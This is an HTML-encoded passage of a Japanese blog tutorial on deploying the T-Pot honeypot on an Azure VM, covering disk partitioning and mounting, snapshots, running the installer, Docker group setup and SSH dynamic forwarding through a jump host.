&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0     &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;:0    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;61&lt;/span&gt;.9M  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; loop /snap/core20/1328
loop1     &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;:1    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;43&lt;/span&gt;.4M  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; loop /snap/snapd/14549
loop2     &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;:2    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;67&lt;/span&gt;.2M  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; loop /snap/lxd/21835
sda       &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:0    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  128G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; disk
sdb       &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:16   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;   30G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; disk
├─sdb1    &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:17   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;.9G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part /
├─sdb14   &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:30   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;    4M  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part
└─sdb15   &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:31   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  106M  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part /boot/efi
sdc       &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:32   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;   16G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; disk
└─sdc1    &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:33   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;   16G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part /mnt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今回追加したディスクは&lt;code class=&quot;language-text&quot;&gt;sda&lt;/code&gt;として認識されているので、これをマウントしていきます。&lt;/p&gt;
&lt;p&gt;今回は空の新規ディスクとして追加しているので、まずはパーティション作成を行う必要があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;parted&lt;/span&gt; /dev/sda --script mklabel gpt mkpart xfspart xfs &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;% &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;%&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでもう一度&lt;code class=&quot;language-text&quot;&gt;lsblk&lt;/code&gt;を叩くと&lt;code class=&quot;language-text&quot;&gt;sda1&lt;/code&gt;ができているので、以下のコマンドでXFSファイルシステムのフォーマットを実施します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; mkfs.xfs /dev/sda1
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; partprobe /dev/sda1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;UbuntuではなくDebianの場合は、事前に&lt;code class=&quot;language-text&quot;&gt;xfsprogs&lt;/code&gt;をインストールする必要がある場合があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; xfsprogs&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://techviewleo.com/fix-mkfs-xfs-no-such-file-or-directory/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Fix “mkfs.xfs: No such file or directory” on CentOS/Ubuntu/Debian - TechViewLeo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最後にこれからハニーポットをインストールするために&lt;code class=&quot;language-text&quot;&gt;tpot&lt;/code&gt;ディレクトリを作成し、&lt;code class=&quot;language-text&quot;&gt;/dev/sda1&lt;/code&gt;をマウントしました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;mkdir&lt;/span&gt; ~/tpot
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mount&lt;/span&gt; /dev/sda1 ~/tpot&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで再度&lt;code class=&quot;language-text&quot;&gt;lsblk&lt;/code&gt;を叩くと、マウントが適切に反映されていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0     &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;:0    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;61&lt;/span&gt;.9M  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; loop /snap/core20/1328
loop1     &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;:1    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;43&lt;/span&gt;.4M  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; loop /snap/snapd/14549
loop2     &lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;:2    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;67&lt;/span&gt;.2M  &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; loop /snap/lxd/21835
sda       &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:0    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  128G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; disk
└─sda1    &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:1    &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  128G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part /home/azureuser/tpot
sdb       &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:16   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;   30G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; disk
├─sdb1    &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:17   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;.9G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part /
├─sdb14   &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:30   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;    4M  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part
└─sdb15   &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:31   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  106M  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part /boot/efi
sdc       &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:32   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;   16G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; disk
└─sdc1    &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;:33   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;   16G  &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; part /mnt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/virtual-machines/linux/expand-disks&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Linux VM の仮想ハード ディスクを拡張する - Azure Virtual Machines | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;スナップショットの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B9%E3%83%8A%E3%83%83%E3%83%97%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;スナップショットの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;スナップショットの作成&lt;/h2&gt;
&lt;p&gt;だいたい準備が終わったのでいよいよT-Potをインストールしていきますが、その前に一応ディスクのスナップショットを取得しておきます。&lt;/p&gt;
&lt;p&gt;Azure のディスクのスナップショットを取得しておくことで、何か問題があった場合に新しくマシンを立て直して復旧することができます。&lt;/p&gt;
&lt;p&gt;正直スナップショットだけでも意外と月額料金かかるのであまり個人では使いたくないのですが、とりあえずやっておきます。&lt;/p&gt;
&lt;p&gt;詳しいやり方は以下リンクがわかりやすいと思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://jpaztech.github.io/blog/vm/vm-replica-3/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;VM 複製方法について part.3/3 OS ディスクのスナップショットから複製する手順 | Japan Azure IaaS Core Support Blog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;仮想マシンの電源を落としてディスクからスナップショットを作成するだけです。&lt;/p&gt;
&lt;p&gt;スナップショットが作成できたら、最後にT-Potのインストールを行います。&lt;/p&gt;
&lt;h2 id=&quot;t-potのインストール&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#t-pot%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB&quot; aria-label=&quot;t potのインストール permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;T-Potのインストール&lt;/h2&gt;
&lt;p&gt;T-Potのインストール前に、Cloud Oneのアンチマルウェア機能を無効化しておきます。&lt;/p&gt;
&lt;p&gt;続いて以下のコマンドを順に実行していきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; ~/tpot
&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; clone https://github.com/telekom-security/tpotce
&lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; tpotce/iso/installer/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;tpot.conf.dist&lt;/code&gt;というファイルに以下の設定が書かれています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# tpot configuration file&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;# myCONF_TPOT_FLAVOR=[STANDARD, SENSOR, INDUSTRIAL, COLLECTOR, NEXTGEN, MEDICAL]&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;myCONF_TPOT_FLAVOR&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;STANDARD&apos;&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;myCONF_WEB_USER&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;webuser&apos;&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;myCONF_WEB_PW&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;w3b$ecret&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;デフォルトだとT-Potのタイプが&lt;code class=&quot;language-text&quot;&gt;STANDARD&lt;/code&gt;になっています。&lt;/p&gt;
&lt;p&gt;次に、ユーザ名とパスワードを任意に変更した後、以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;cp&lt;/span&gt; tpot.conf.dist tpot.conf
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; ./install.sh --type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;auto --conf&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;tpot.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで問題なく完了すれば、以下のような出力になります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 586px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3fd95a38ed4642336665649abe7a5a59/a76f4/image-28-164640098996331.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 93.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAACjUlEQVQ4y41U23LaQAz1U1uadNqZPjSQpCEhQIFwsQHfwDYGzM0Gh5CWtv//H6qOYDOhk5I+nNFetGel1dFqDcOlthVQrWlRudamb3cdMkyfKvUuYQ/Ael23Se96vOdRs+2Kn/J/Dg0OvWBKHXvACITc6o0EGDvemK1PrU5fxjavd53wIAAFzDU42v2x3AxS2K4zEIDQdIcSJaIG4HPXsqlUNahY0cUCilwIccj1J5KSivQpWt6DBbCHi5rtnlwCf5zHvNowdxFOFmsCWryIVECMCxwvksi9cEEmp4k59lx/Kk9k8R7meBr413VHItXidEtNw6ar6yJ9/PSZ3rzN0LvMKZ3l8nRxVaLcZYHOvxYZtwfAXqHclLQldZVyrWFQ/qZElVqLbst1yp7nmeSGDxVknL24phxDxnuc7X1eLIofziiapeT0h9SxPK7ikFMYcCohpzunYJyQP4ppNE25KAHLyZQKVxvWi9LR4Lja/OZ3iTjVE3p/8oEybL9kL0WLOKAOqfFz/E2q9fmBh5MlR7DiKFl/bsjFCfjBIwqjRCpZrBhHSQ4iRPkhERxEpZAOdAYLB0QJQBawx8j2neKLttAF0BNkoMQN7WF/J3z/SeSQxz8JRdisPzijR6E3EJpuKGnrIvxQ2g/ErxKqDgCxskhffQoqZelnzuBYukI4jTeU3G9pPLsXO18+8jil0WQlUatCqH59tShx+oNWD7+40ishRLWxNks20mKqOP8LbcYRov0Q1XL9k+bJo5BCMm0uhPpNjkG1n3RKNF9LhLAANDlffqck3YrFu6L6gN7tS7Vh8dYKux9qINLSEBlIFnzY4zbEfBo/sGNPCoEfSB3c/Y+hrKnfG2v4daAAPM8fiDNjAzu1lgMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3fd95a38ed4642336665649abe7a5a59/8ac56/image-28-164640098996331.webp 240w,
/static/3fd95a38ed4642336665649abe7a5a59/d3be9/image-28-164640098996331.webp 480w,
/static/3fd95a38ed4642336665649abe7a5a59/7fed0/image-28-164640098996331.webp 586w&quot;
              sizes=&quot;(max-width: 586px) 100vw, 586px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3fd95a38ed4642336665649abe7a5a59/8ff5a/image-28-164640098996331.png 240w,
/static/3fd95a38ed4642336665649abe7a5a59/e85cb/image-28-164640098996331.png 480w,
/static/3fd95a38ed4642336665649abe7a5a59/a76f4/image-28-164640098996331.png 586w&quot;
            sizes=&quot;(max-width: 586px) 100vw, 586px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3fd95a38ed4642336665649abe7a5a59/a76f4/image-28-164640098996331.png&quot;
            alt=&quot;image-28.png&quot;
            title=&quot;image-28.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでT-Potのインストールは完了です。&lt;/p&gt;
&lt;p&gt;T-Potインストールが完了すると、ポート22でのSSHが無効化されます。&lt;/p&gt;
&lt;p&gt;デフォルトの設定の場合SSHの接続ポートは64295になるのでSSH接続できることを確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;ssh&lt;/span&gt; -i .ssh/id_rsa -p &lt;span class=&quot;token number&quot;&gt;64295&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;T-Pot&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちなみに、T-Potのサービスごとのポートはデフォルトで以下に設定されています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH：64295&lt;/li&gt;
&lt;li&gt;WEBコンソール：64297&lt;/li&gt;
&lt;li&gt;ADMINサイト：64294&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これらのポートはインターネット側からアクセスできないよう、セキュリティグループで踏み台サーバからのみアクセス可能なように設定しておきます。&lt;/p&gt;
&lt;h3 id=&quot;dockerユーザの追加&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#docker%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AE%E8%BF%BD%E5%8A%A0&quot; aria-label=&quot;dockerユーザの追加 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dockerユーザの追加&lt;/h3&gt;
&lt;p&gt;T-Potのインストールが完了するとマシン内にDockerがインストールされます。&lt;/p&gt;
&lt;p&gt;ただし、インストール直後の時点ではDockerサービスには一般ユーザではアクセスできません。&lt;/p&gt;
&lt;p&gt;今後、一般ユーザでログインしたPilotコンソールからDockerサービスの監視を行えるようにするために、以下のコマンドでDockerグループにユーザを追加しておきましょう。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;usermod&lt;/span&gt; -aG &lt;span class=&quot;token function&quot;&gt;docker&lt;/span&gt; &lt;span class=&quot;token environment constant&quot;&gt;$USER&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;一般ユーザでDockerサービスを使用可能にすることで、以下のようにPilotコンソールからDockerコンテナを監視できるようになります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1132a19df371b0c9c5f364cb064ddd1e/0b533/image-56-164640099393233.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 50.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAARlAAAEZQAGA43XUAAABW0lEQVQoz3WSUUrDQBCGcyV9KFSsVAQrPlgUBE/lMQSP4IMH8Aj2yQeTWjANTXaT3TTZ35nZrl2iDfxsd6bz5f+nTcbTC1zN7/C+WGC1WiHPczS1xmazQVEUWJPydYGqqkRlWcqptYZW2p+RktHkXIBfBOOnaVto22K73cr96fUNj88vcK5H13WwrUXf9zj0JNPZNeb3D/hMU7o6VI3FWtU0TEPOISsUPr7LP4OOerFCjRxOxaEHUpHe3pMTbnqXTjR0FcO411IyTpCMznzkNMvEEUMU7YJPaw3qpoGua/pspcbiwSHY9wh4ND7F5c0t0jSTLwhQKRkyBFO7Zdc7KCu4Ca6DQ55Njk8mmDEwW/4C2RUPBEf/KUBDZEnAkRnIDrPlUnbFRWM8MI423Ft8D8AuAL3DTBr8dk3/Q3bA4hpr+KvG4L1DjjzeOaTIIUrd7PfFMsZI7xA0jvwD4P7kBk8yjXEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1132a19df371b0c9c5f364cb064ddd1e/8ac56/image-56-164640099393233.webp 240w,
/static/1132a19df371b0c9c5f364cb064ddd1e/d3be9/image-56-164640099393233.webp 480w,
/static/1132a19df371b0c9c5f364cb064ddd1e/b0a15/image-56-164640099393233.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1132a19df371b0c9c5f364cb064ddd1e/8ff5a/image-56-164640099393233.png 240w,
/static/1132a19df371b0c9c5f364cb064ddd1e/e85cb/image-56-164640099393233.png 480w,
/static/1132a19df371b0c9c5f364cb064ddd1e/0b533/image-56-164640099393233.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1132a19df371b0c9c5f364cb064ddd1e/0b533/image-56-164640099393233.png&quot;
            alt=&quot;image-56.png&quot;
            title=&quot;image-56.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;sshダイナミックフォワーディングで踏み台経由でt-potに接続&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ssh%E3%83%80%E3%82%A4%E3%83%8A%E3%83%9F%E3%83%83%E3%82%AF%E3%83%95%E3%82%A9%E3%83%AF%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%81%A7%E8%B8%8F%E3%81%BF%E5%8F%B0%E7%B5%8C%E7%94%B1%E3%81%A7t-pot%E3%81%AB%E6%8E%A5%E7%B6%9A&quot; aria-label=&quot;sshダイナミックフォワーディングで踏み台経由でt potに接続 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SSHダイナミックフォワーディングで踏み台経由でT-Potに接続&lt;/h3&gt;
&lt;p&gt;次は踏み台サーバ経由でT-PotのWEBコンソールに接続します。&lt;/p&gt;
&lt;p&gt;まずは、ホストマシン側で、踏み台サーバに対して以下のようにSSH接続を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;ssh&lt;/span&gt; -fN -D &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;Forwarding Port&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; -i .ssh/honeypot.pem &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;Username@IP Addr&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでホストマシンの&lt;code class=&quot;language-text&quot;&gt;&amp;lt;Forwarding Port&gt;&lt;/code&gt;を経由して踏み台サーバに接続できるようになります。&lt;/p&gt;
